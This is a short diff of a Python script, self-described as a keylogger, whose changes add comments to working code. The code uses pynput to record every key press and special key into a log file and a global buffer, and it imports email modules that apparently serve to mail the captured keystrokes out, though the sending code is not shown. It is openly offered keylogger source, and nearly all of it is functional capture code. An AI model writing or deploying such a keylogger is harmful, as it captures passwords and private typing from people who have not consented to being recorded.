@@ -4,9 +4,11 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
 
+# key logging variables including file path to log file
 log_file = "key_presses.txt"
 keys_pressed = "" 
 
+# Records key presses
 def on_press(key):
     global keys_pressed
     try:
@@ -16,6 +18,7 @@ def on_press(key):
         keys_pressed += f"[{key}]"  # special key
         print(f"Special key {key} pressed")
 
+# Records released keys
 def on_release(key):
     global keys_pressed
     
@@ -29,5 +32,6 @@ def on_release(key):
         print("Exiting keylogger...")
         return False
 
+# Keyboard listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
